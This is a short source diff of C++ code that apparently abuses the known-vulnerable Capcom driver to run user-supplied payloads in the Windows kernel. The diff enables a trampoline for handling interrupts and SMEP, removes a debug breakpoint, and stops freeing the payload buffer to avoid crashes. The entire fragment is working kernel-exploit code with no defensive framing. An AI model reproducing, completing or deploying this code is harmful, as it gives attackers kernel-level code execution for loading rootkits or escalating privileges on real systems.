@@ -42,7 +42,6 @@ BOOL InitDriver() {
     }
 
     initIntSmepTrampoline();
-    
     return TRUE;
 }
 
@@ -80,7 +79,7 @@ void RunInKernel(UserFunc func, PVOID userData) {
     DWORD status = 0x0;
     DWORD bytesReturned = 0x0;
     DeviceIoControl(device, IOCTL_RunPayload64, &codePayload->pointerToPayload, sizeof(ULONG_PTR), &status, sizeof(status), &bytesReturned, 0);
-    VirtualFree(codePayload, sizeof(CapcomCodePayload), MEM_RELEASE);
+    // VirtualFree(codePayload, sizeof(CapcomCodePayload), MEM_RELEASE); // do not do this, it causes random bluescreens
 }
 
 /********* CALLS WITH ENABLED INTERRUPTS AND SMEP *********/
@@ -118,11 +117,10 @@ NON_PAGED_CODE static uint64_t CallWithInterruptsAndSmep(PVOID ptr, Params &&...
 }
 
 NON_PAGED_CODE void __stdcall CreateIntSmepTrampoline(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress, PVOID userData) {
-    DebugBreak();
     ExAllocatePoolPtr = (decltype(ExAllocatePoolPtr))GetKernelRoutine(pMmGetSystemRoutineAddress, L"ExAllocatePool");
-    // PVOID out = (PVOID)ExAllocatePoolPtr(0ull, sizeof(intAndSmepHandlingTrampoline));
-	// NonPagedMemcpy(out, intAndSmepHandlingTrampoline, sizeof(intAndSmepHandlingTrampoline));
-	// TrampolineFuncPtr = (kernelTrampolineCall)out;
+    PVOID out = (PVOID)ExAllocatePoolPtr(0ull, sizeof(intAndSmepHandlingTrampoline));
+	NonPagedMemcpy(out, intAndSmepHandlingTrampoline, sizeof(intAndSmepHandlingTrampoline));
+	TrampolineFuncPtr = (kernelTrampolineCall)out;
 }
 
 void initIntSmepTrampoline() {
